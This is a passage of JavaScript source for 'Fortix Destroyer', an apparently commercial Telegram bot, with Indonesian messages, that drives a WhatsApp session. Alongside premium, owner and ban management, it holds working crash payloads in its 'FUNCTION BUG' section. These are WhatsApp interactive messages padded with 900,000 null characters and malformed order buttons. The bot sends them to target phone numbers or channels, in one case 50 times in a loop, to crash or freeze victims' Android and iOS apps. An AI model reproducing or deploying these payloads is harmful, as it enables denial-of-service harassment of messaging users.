┃ 𝙿𝚛𝚘𝚌𝚌𝚎𝚜 𝚂𝚎𝚗𝚍 𝙵𝚘𝚛𝚌𝚎 𝚃𝚘 𝙲𝚑𝚊𝚗𝚗𝚎𝚕
┃ 𝙸𝙳 : ${channelId}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
        });

        for (let i = 0; i < 50; i++) {
            await crashch(channelId);
        }

        await bot.sendPhoto(chatId, "https://files.catbox.moe/dnyx9m.png", {
            caption: `┏━━━━━𝐅𝐎𝐑𝐓𝐈𝐗 𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑━━━━━━┓
┃ 𝚂𝚞𝚌𝚌𝚎𝚜 𝚂𝚎𝚗𝚍 𝙵𝚘𝚛𝚌𝚎 𝚃𝚘 𝙲𝚑𝚊𝚗𝚗𝚎𝚕
┃ 𝙸𝙳 : ${channelId}
┃ 𝙲ᴏᴍᴍᴀ𝚗𝚍 : /forcechannel
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
        });

    } catch (err) {
        console.error('❌ Error forcechannel:', err);
        bot.sendMessage(chatId, "❌ Gagal kirim bug ke channel.");
    }
});
//========================================================\\ 

//========================================================\\ 
bot.onText(/\/addprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (bannedUsers.includes(senderId)) return;
  try {
    if (!owners.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Akses Ditolak! Khusus Owner dan SuperVIP.");
    }

    const userId = match[1];
    if (!userId) {
      return bot.sendMessage(chatId, "❌ Format Salah\nContoh: /addprem 7112830272");
    }

    if (premiumUsers.includes(Number(userId))) {
      return bot.sendMessage(chatId, `❌ ${userId} sudah Premium.`);
    }

    premiumUsers.push(Number(userId));
    savePremiumUsers();
    console.log(`[ADD PREMIUM] ${senderId} menambahkan ${userId}`);
    bot.sendMessage(chatId, `✅ ${userId} berhasil ditambahkan sebagai pengguna Premium.`);

  } catch (error) {
    console.error("Error di /addprem:", error);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menambahkan Premium.");
  }
});
//========================================================\\ 

//========================================================\\ 
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (bannedUsers.includes(senderId)) return;
  try {
    if (!owners.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Akses Ditolak! Khusus Owner dan SuperVIP.");
    }

    const userId = match[1];
    if (!userId) {
      return bot.sendMessage(chatId, "❌ Format Salah\nContoh: /delprem 7112830272");
    }

    const index = premiumUsers.indexOf(Number(userId));
    if (index === -1) {
      return bot.sendMessage(chatId, `❌ ${userId} bukan pengguna Premium.`);
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers();
    console.log(`[DEL PREMIUM] ${senderId} menghapus ${userId}`);
    bot.sendMessage(chatId, `✅ ${userId} berhasil dihapus dari daftar Premium.`);

  } catch (error) {
    console.error("Error di /delprem:", error);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghapus Premium.");
  }
});
//========================================================\\  

//========================================================\\ 
bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (bannedUsers.includes(senderId)) return;
  if (!owners.includes(senderId) && !superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak! Khusus Owner dan SuperVIP.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📭 Tidak ada pengguna Premium saat ini.");
  }

  const list = premiumUsers.map((id, i) => `${i + 1}. ${id}`).join("\n");
  bot.sendMessage(chatId, `📋 Daftar Pengguna Premium:\n\n${list}`, { parse_mode: 'Markdown' });
});
//========================================================\\  

//========================================================\\ 
bot.onText(/\/clearprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (bannedUsers.includes(senderId)) return;
  if (!owners.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak! Khusus Owner.");
  }

  try {
    const beforeCount = premiumUsers.length;
    premiumUsers = premiumUsers.filter(id => protectedPremiumIds.includes(id));
    const afterCount = premiumUsers.length;

    savePremiumUsers();
    bot.sendMessage(chatId, `✅ Berhasil menghapus ${beforeCount - afterCount} pengguna Premium.\nYang tersisa: ${afterCount}`);
  } catch (error) {
    console.error("Error di /clearprem:", error);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghapus semua Premium.");
  }
});
//========================================================\\  

//========================================================\\ 
bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (bannedUsers.includes(senderId)) return;
  if (!superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak! Khusus SuperVIP.");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Format Salah!\nContoh: /addowner 7112830272");
  }

  const userId = parseInt(match[1].replace(/\D/g, ''), 10);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ ID tidak valid!");
  }

  if (!owners.includes(userId)) {
    owners.push(userId);
    saveOwnersUsers();
    console.log(`[ADD OWNER] ${senderId} menambahkan ${userId} ke owner`);
    bot.sendMessage(chatId, `✅ ${userId} berhasil ditambahkan ke Owner.`);
  } else {
    bot.sendMessage(chatId, `❌ ${userId} sudah menjadi Owner.`);
  }
});
//========================================================\\  

//========================================================\\ 
bot.onText(/\/delowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (bannedUsers.includes(senderId)) return;
  if (!superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak! Khusus SuperVIP.");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Format Salah!\nContoh: /delowner 7112830272");
  }

  const userId = parseInt(match[1].replace(/\D/g, ''), 10);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ ID tidak valid!");
  }

  if (owners.includes(userId)) {
    owner = owners.filter(id => id !== userId);
    saveOwnersUsers();
    console.log(`[DEL OWNER] ${senderId} menghapus ${userId} dari owner`);
    bot.sendMessage(chatId, `✅ ${userId} berhasil dihapus dari Owner.`);
  } else {
    bot.sendMessage(chatId, `❌ ${userId} bukan Owner.`);
  }
});
//========================================================\\  

//========================================================\\ 
bot.onText(/\/banfortix/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (bannedUsers.includes(senderId)) return;
  if (!superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak! Khusus SuperVIP.");
  }

  const reply = msg.reply_to_message;
  if (!reply) {
    return bot.sendMessage(chatId, "❌ Gunakan perintah ini dengan membalas pesan pengguna yang ingin diblokir.");
  }

  const target = reply.from;
  const targetId = target.id;
  const tag = target.username ? `@${target.username}` : target.first_name;

  if (bannedUsers.includes(targetId)) {
    return bot.sendMessage(chatId, `⚠️ ${tag} sudah diblokir sebelumnya.`);
  }

  bannedUsers.push(targetId);
  saveBannedUsers();
  bot.sendMessage(chatId, `✅ ${tag} (${targetId}) berhasil diblokir dari penggunaan bot.`);
});
//========================================================\\  

//========================================================\\ 
bot.onText(/\/unbanfortix/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (bannedUsers.includes(senderId)) return;
  if (!superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak! Khusus SuperVIP.");
  }

  const reply = msg.reply_to_message;
  if (!reply) {
    return bot.sendMessage(chatId, "❌ Gunakan perintah ini dengan membalas pesan pengguna yang ingin di-unban.");
  }

  const target = reply.from;
  const targetId = target.id;
  const tag = target.username ? `@${target.username}` : target.first_name;

  if (!bannedUsers.includes(targetId)) {
    return bot.sendMessage(chatId, `⚠️ ${tag} tidak ada dalam daftar banned.`);
  }

  bannedUsers = bannedUsers.filter(id => id !== targetId);
  saveBannedUsers();
  bot.sendMessage(chatId, `✅ ${tag} (${targetId}) telah di-unban.`);
});
//========================================================\\  

//========================================================\\ 
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (onlyGroupMode && msg.chat.type === 'private' && !superVip.includes(senderId)) {
        return bot.sendMessage(chatId, "⚠️ Bot hanya bisa digunakan di grup saat ini.");
    }
});
//========================================================\\  

//========================================================\\ 
bot.onText(/\/onlygc(?:\s(on|off))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (bannedUsers.includes(senderId)) return;
    if (!superVip.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Hanya untuk SuperVIP.");
    }

    const mode = match[1];
    if (!mode) return bot.sendMessage(chatId, "❌ Format: /onlygc on atau /onlygc off");

    onlyGroupMode = mode.toLowerCase() === 'on';
    const status = onlyGroupMode ? '*AKTIF*' : '*NONAKTIF*';
    bot.sendMessage(chatId, `✅ Mode Khusus Grup sekarang ${status}.`, { parse_mode: 'Markdown' });
});
//========================================================\\  

//========================================================\\ 
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const senderId = callbackQuery.from.id;

  if (bannedUsers.includes(senderId)) return;

  const senderName = callbackQuery.from.username ? `@${callbackQuery.from.username}` : `${senderId}`;
  const [action] = callbackQuery.data.split(":");
  const userStatus = premiumUsers.includes(senderId) ? "𝐘𝐞𝐬" : "𝐍𝐨";
  const waStatus = whatsappStatus ? "𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝" : "𝐃𝐢𝐬𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝";
  const groupModeStatus = onlyGroupMode ? "𝐎𝐧" : "𝐎𝐟𝐟";

  try {
    if (action === "start") {
      const caption = `
\`\`\`JawaScript
[ 🐉 ] olá ${senderName} привет я бот 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝘂𝗴🦠 Меня создал разработчик Дани. Наслаждайтесь использованием этого скрипта 

◈──── [ 𝐈 𝐍 𝐅 𝐎 — 𝐁 𝐎 𝐓 ] ────◈
╰─➤ 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : 𝐅⃯𝐨𝐫້⃯𝐭᤻𝐢⃗𝐱 𝐃𝐞𑂹ຼ᳑𝐬𝐭𝐫ົ⃯𝐨𝐲⃯⃗𝐞𝐫᭨
╰─➤ 𝐁𝐨𝐭 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏.𝟎 
╰─➤ 𝐆𝐫𝐨𝐮𝐩 𝐌𝐨𝐝𝐞 : ${groupModeStatus}
╰─➤ 𝐓𝐲𝐩𝐞 : 𝐁𝐮𝐭𝐭𝐨𝐧
╰─➤ 𝐋𝐚𝐧𝐠𝐮𝐚𝐠𝐞 : 𝐉𝐚𝐯𝐚𝐒𝐜𝐫𝐢𝐩𝐭

◈──── [ 𝐒 𝐓 𝐀 𝐓 𝐔 𝐒 ] ────◈
╰─➤ 𝐘𝐨𝐮𝐫 𝐏𝐫𝐞𝐦 : ${userStatus}
╰─➤ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 : ${waStatus}
╰─➤ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${getOnlineDuration()}

\`\`\`
©𝐅𝐨𝐫𝐭𝐢𝐱 𝐍𝐞𝐰 𝐄𝐫𝐚`;

      const buttons = [
        [
          { text: "─[ Меню ☇ ошибок ]─", callback_data: "bugmenu" },
          { text: "─[ Меню ☇ владельца ]─", callback_data: "ownermenu" }
        ],
        [
          { text: "─[ Tq To ]─", callback_data: "tqto" }
        ]
      ];

      await bot.editMessageMedia(
        {
          type: "photo",
          media: "https://img1.pixhost.to/images/5526/595359312_skyzopedia.jpg",
          caption: caption,
          parse_mode: "MarkdownV2"
        },
        {
          chat_id: chatId,
          message_id: callbackQuery.message.message_id,
          reply_markup: { inline_keyboard: buttons }
        }
      );
      return;
    }

    let caption = "";
    let buttons = [];

    if (action === "ownermenu") {
      caption = `
\`\`\`JawaScript
╭──────[ 𝐎 𝐖 𝐍 𝐄 𝐑 — 𝐌 𝐄 𝐍 𝐔 ]──────◈
│➵ /ᴏɴʟʏɢᴄ <ᴏɴ - ᴏғғ>
│╰┈➤ ʙᴏᴛ ᴋʜᴜsᴜs ɢʀᴏᴜᴘ ᴅᴀɴ ᴛɪᴅᴀᴋ ᴍᴇʀᴇsᴘᴏɴ ᴅɪ ᴘʀɪᴠᴀᴛ ᴄʜᴀᴛ
│
│➵ /ᴀᴅᴅᴘʀᴇᴍ <ɪᴅ>
│╰┈➤ ᴀᴅᴅ ᴀᴄᴄᴇs ʙᴜɢ
│
│➵ /ᴅᴇʟᴘʀᴇᴍ <ɪᴅ>
│╰┈➤ ᴅᴇʟ ᴀᴄᴄᴇs ʙᴜɢ
│
│➵ /ʟɪsᴛᴘʀᴇᴍ 
│╰┈➤ ᴄᴇᴋ ᴀʟʟ ɪᴅ ᴀᴄᴄᴇs ᴘʀᴇᴍ
│
│➵ /ᴄʟᴇᴀʀᴘʀᴇᴍ <ᴍᴇɴɢʜᴀᴘᴜs sᴇᴍᴜᴀ ɪᴅ ᴀᴄᴄᴇs ᴘʀᴇᴍ>
│╰┈➤ ɪᴅ ʏᴀɴɢ ᴅɪ ʙʟᴏᴋɪʀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴋᴇ ʜᴀᴘᴜs
│
│➵ /ᴀᴅᴅᴏᴡɴᴇʀ <ɪᴅ>
│╰┈➤ ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ ᴀᴄᴄᴇs ᴏᴡɴᴇʀ
│
│➵ /ᴅᴇʟᴏᴡɴᴇʀ <ɪᴅ>
│╰┈➤ ᴍᴇɴɢʜᴀᴘᴜs ᴀᴄᴄᴇs ᴏᴡɴᴇʀ
│ɴᴏᴛᴇ : ᴀᴄᴄᴇs ᴏᴡɴᴇʀ ʙɪsᴀ ᴀᴅᴅᴘʀᴇᴍ & ᴅᴇʟᴘʀᴇᴍ
│
│➵ /ʙᴀɴғᴏʀᴛɪx <ʀᴇᴘʟʏ,ᴛᴀɢ,ɪᴅ>
│╰┈➤ ᴘᴇɴɢɢᴜɴᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ʙᴏᴛ
│
│➵ /ᴜɴʙᴀɴғᴏʀᴛɪx  <ʀᴇᴘʟʏ,ᴛᴀɢ,ɪᴅ>
│╰┈➤ ᴘᴇɴɢɢᴜɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴋsᴇss ʙᴏᴛ ᴋᴇᴍʙᴀʟɪ
│
╰──────────────────────◈
\`\`\`
©𝐅𝐨𝐫𝐭𝐢𝐱 𝐍𝐞𝐰 𝐄𝐫𝐚`;
      buttons = [[{ text: "𝐊𝐞𝐦𝐛𝐚𝐥𝐢 𝐤𝐞 𝐒𝐭𝐚𝐫𝐭", callback_data: "start" }]];
    } else if (action === "tqto") {
      caption = `
\`\`\`JawaScript
╓────[ 𝗧 𝗤 — 𝗧 𝗢 ]────────────◈
│ • 𝗙𝗼𝗿𝘁𝗶𝘅 𝗧𝗲𝗮𝗺
│
│ • 𝗗𝗮𝗻𝘇 ( 𝗗𝗲𝘃 )
│
│ • 𝗣𝘂𝘁𝗿𝗮 ( 𝗧𝗲𝗮𝗺 ) 
│
│ • 𝗦𝗮𝗿𝗶𝗽 ( 𝗧𝗲𝗮𝗺 ) 
│
│ • 𝗦𝘂𝗿𝘆𝗮 ( 𝗧𝗲𝗮𝗺 ) 
│
│ • 𝗔𝗺𝗺𝗮𝗿 ( 𝗧𝗲𝗮𝗺 ) 
│
│ • 𝗔𝗹𝗹𝗮𝗵 𝗦.𝘄.𝘁
│
│ • 𝗖𝗵𝗮𝘁 𝗚𝗣𝗧
│
│ 𝗡𝗼𝘁𝗲 : 𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼 𝗕𝘂𝘆 𝗦𝗰𝗿𝗶𝗽𝘁
╙──────────────────────────────◈
\`\`\`
©𝐅𝐨𝐫𝐭𝐢𝐱 𝐍𝐞𝐰 𝐄𝐫𝐚`;
      buttons = [[{ text: "𝐊𝐞𝐦𝐛𝐚𝐥𝐢 𝐤𝐞 𝐒𝐭𝐚𝐫𝐭", callback_data: "start" }]];
    } else if (action === "bugmenu") {
      caption = `
\`\`\`JawaScript
╭──────[ 𝐁 𝐔 𝐆 — 𝐌 𝐄 𝐍 𝐔 ]───────◈
│➵ /ᴅᴇʟᴀʏᴠᴜᴄᴋ <62×××>
│╰┈➤ ɴɢᴜʀᴀs ᴋᴜᴏᴛᴀ x ᴅᴇʟᴀʏ ɪɴᴠ
│
│➵ /ᴅᴇʟᴀʏɪɴᴠɪs <62×××>
│╰┈➤ ᴅᴇʟᴀʏ ɪɴᴠɪs
│
│➵ /ᴀᴛᴛᴀᴄᴋᴜɪ <62×××>
│╰┈➤ ᴄʀᴀsʜ ᴜɪ ᴀɴᴅʀᴏ <ᴛɪᴅᴀᴋ sᴇᴍᴜᴀ ʜᴘ ᴀɴᴅʀᴏ ᴄʀᴀsʜ>
│
│➵ /ᴄᴏᴍʙᴏ <62×××>
│╰┈➤ ᴅᴇʟᴀʏ ɪɴᴠ x ᴄʀᴀsʜ ᴜɪ x ʙʟᴀɴᴋ
│
│➵ /ᴄʀᴀsʜɪᴏs
│╰┈➤ ᴄʀᴀsʜ ᴅᴇᴠɪᴄᴇ ɪᴏs 
│
│➵ /ғᴏʀᴄᴇᴄʜ <ɴᴇᴡsʟᴇᴛᴛᴇʀ>
│╰┈➤ ғᴏʀᴄᴇ ᴄʟᴏsᴇ ᴄʜᴀɴɴᴇʟ
╰──────────────────────◈
\`\`\`
©𝐅𝐨𝐫𝐭𝐢𝐱 𝐍𝐞𝐰 𝐄𝐫𝐚`;
      buttons = [[{ text: "𝐊𝐞𝐦𝐛𝐚𝐥𝐢 𝐤𝐞 𝐒𝐭𝐚𝐫𝐭", callback_data: "start" }]];
    }

    if (caption && buttons.length) {
      await bot.editMessageCaption(caption, {
        chat_id: chatId,
        message_id: callbackQuery.message.message_id,
        parse_mode: "MarkdownV2",
        reply_markup: { inline_keyboard: buttons }
      });
    }

  } catch (err) {
    console.error("Callback error:", err);
    await bot.sendMessage(chatId, "Terjadi kesalahan saat memproses permintaanmu. Silakan coba lagi nanti.");
  }
});

//========================================================\\  

//========================================================\\ 

// FUNCTION BUG
// #1
async function crashBug(target) {
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              subtitle: "\u0000".repeat(900000),
              title: "⚡️ Crash Bug Triggered ⚡️",
              locationMessage: {},
              hasMediaAttachment: false,
            },
            body: {
              text: "⚡️ Application Crashed ⚡️",
            },
            nativeFlowMessage: {
              messageParamsJson: "⚡️ Application Crashed ⚡️",
            },
            carouselMessage: {},
          },
        },
      },
    },
    {}
  );

  await delay(2000);

  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              subtitle: "\u0000".repeat(900000),
              title: "⚡️ Crash Bug Triggered ⚡️",
              locationMessage: {},
              hasMediaAttachment: false,
            },
            body: {
              text: "⚡️ Application Crashed ⚡️",
            },
            nativeFlowMessage: {
              messageParamsJson: "⚡️ Application Crashed ⚡️",
            },
            carouselMessage: {},
          },
        },
      },
    },
    {}
  );
}

// #2
async function delayBug(target) {
  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  await delay(5000);

  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              subtitle: "\u0000".repeat(900000),
              title: "⏳ Delay Bug Triggered ⏳",
              locationMessage: {},
              hasMediaAttachment: false,
            },
            body: {
              text: "⏳ Delay Triggered for 5 seconds ⏳",
            },
            nativeFlowMessage: {
              messageParamsJson: "⏳ Delay Triggered for 5 seconds ⏳",
            },
            carouselMessage: {},
          },
        },
      },
    },
    {}
  );
}

// #3
async function invisibleBug(target) {
  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              subtitle: "\u0000".repeat(900000),
              title: "👻 Invisible Bug Triggered 👻",
              locationMessage: {},
              hasMediaAttachment: false,
            },
            body: {
              text: "👻 Invisible Bug Triggered (Message Hidden) 👻",
            },
            nativeFlowMessage: {
              messageParamsJson: "👻 Invisible Bug Triggered (Message Hidden) 👻",
            },
            carouselMessage: {},
          },
        },
      },
    },
    {}
  );

  await delay(2000);

  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              subtitle: "\u0000".repeat(900000),
              title: "👻 Invisible Bug Triggered 👻",
              locationMessage: {},
              hasMediaAttachment: false,
            },
            body: {
              text: "👻 Invisible Bug Triggered (Message Hidden) 👻",
            },
            nativeFlowMessage: {
              messageParamsJson: "👻 Invisible Bug Triggered (Message Hidden) 👻",
            },
            carouselMessage: {},
          },
        },
      },
    },
    {}
  );
}
// FINAL DELAY

// ONLY CH
async function forcech1(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target }); 

  await sock.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}
async function forcech2(target) {
    await sock.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "peler"
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "review_order",
                                    buttonParamsJson: "\u0000".repeat(99999)
                                }
                            ]
                        }
                    }
                }
            }
        },
        {},
        { messageId: null }
    );
}
// FINAL CH

// FINAL FUNCTION BUG

startSesi(); 